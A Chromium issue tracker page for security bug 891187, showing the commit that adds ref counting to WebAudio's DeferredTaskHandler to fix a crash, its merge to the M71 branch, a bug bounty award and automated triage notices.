  https://chromium.googlesource.com/chromium/src.git/+/729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8

commit 729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8
Author: Hongchan Choi <hongchan@chromium.org>
Date: Fri Oct 19 14:05:07 2018

Use ref counting for automatic nodes in DeferredTaskHandler

Previously the storage for automatic pull nodes (handlers actually)
were using a raw pointer, so when the BaseAudioContext goes away there\
is no object keeping these node alive.

This CL adds ref-counting to the storage so the handler can be alive
even after BaseAudioContext is swept away.

Without this fix, the crash happens in few minutes.

Bug: 891187
Test: The repro case does not crash after 2 hours on the local ASAN.
Change-Id: I33a1f74c5803f53e1ace2990af3dd0728720d258
Reviewed-on: https://chromium-review.googlesource.com/c/1286823
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/heads/master@{#601135}
[modify] https://crrev.com/729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8/third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc
[modify] https://crrev.com/729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8/third_party/blink/renderer/modules/webaudio/deferred_task_handler.h


### ho...@chromium.org (2018-10-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-19)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

This bug requires manual review: M71 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-10-26)

govind@ - good for 71

### go...@chromium.org (2018-10-27)

Approving merge to M71 branch 3578 based on https://crbug.com/chromium/891187#c27. Please merge latest by 3:00 PM PT, Monday (10/29) so we can pick it up for next week beta. Thank you.

### bu...@chromium.org (2018-10-29)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d09551372b8a2c11fb51a6ea79f522f61f8d390e

commit d09551372b8a2c11fb51a6ea79f522f61f8d390e
Author: Hongchan Choi <hongchan@chromium.org>
Date: Mon Oct 29 04:14:49 2018

Use ref counting for automatic nodes in DeferredTaskHandler

Previously the storage for automatic pull nodes (handlers actually)
were using a raw pointer, so when the BaseAudioContext goes away there\
is no object keeping these node alive.

This CL adds ref-counting to the storage so the handler can be alive
even after BaseAudioContext is swept away.

Without this fix, the crash happens in few minutes.

Bug: 891187
Test: The repro case does not crash after 2 hours on the local ASAN.
Change-Id: I33a1f74c5803f53e1ace2990af3dd0728720d258
Reviewed-on: https://chromium-review.googlesource.com/c/1286823
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#601135}(cherry picked from commit 729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8)
Reviewed-on: https://chromium-review.googlesource.com/c/1304114
Reviewed-by: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/branch-heads/3578@{#362}
Cr-Branched-From: 4226ddf99103e493d7afb23a4c7902ee496108b6-refs/heads/master@{#599034}
[modify] https://crrev.com/d09551372b8a2c11fb51a6ea79f522f61f8d390e/third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc
[modify] https://crrev.com/d09551372b8a2c11fb51a6ea79f522f61f8d390e/third_party/blink/renderer/modules/webaudio/deferred_task_handler.h


### ho...@chromium.org (2018-10-29)

govind@

Sorry for the late response. Just got back from the trip and merged the patch to M71 branch. Thanks for the reminder, as always!

### cr...@appspot.gserviceaccount.com (2018-10-29)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/d09551372b8a2c11fb51a6ea79f522f61f8d390e

Commit: d09551372b8a2c11fb51a6ea79f522f61f8d390e
Author: hongchan@chromium.org
Commiter: hongchan@chromium.org
Date: 2018-10-29 04:14:49 +0000 UTC

Use ref counting for automatic nodes in DeferredTaskHandler

Previously the storage for automatic pull nodes (handlers actually)
were using a raw pointer, so when the BaseAudioContext goes away there\
is no object keeping these node alive.

This CL adds ref-counting to the storage so the handler can be alive
even after BaseAudioContext is swept away.

Without this fix, the crash happens in few minutes.

Bug: 891187
Test: The repro case does not crash after 2 hours on the local ASAN.
Change-Id: I33a1f74c5803f53e1ace2990af3dd0728720d258
Reviewed-on: https://chromium-review.googlesource.com/c/1286823
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#601135}(cherry picked from commit 729d147dcbea37c06d2b34f8d53fbbb59e2fb3a8)
Reviewed-on: https://chromium-review.googlesource.com/c/1304114
Reviewed-by: Hongchan Choi <hongchan@chromium.org>
Cr-Commit-Position: refs/branch-heads/3578@{#362}
Cr-Branched-From: 4226ddf99103e493d7afb23a4c7902ee496108b6-refs/heads/master@{#599034}

### aw...@chromium.org (2018-10-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-10-30)

Hi! $3,000 for this report - many thanks!

### aw...@google.com (2018-10-31)

[Empty comment from Monorail migration]

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-25)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/891187?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092590)*
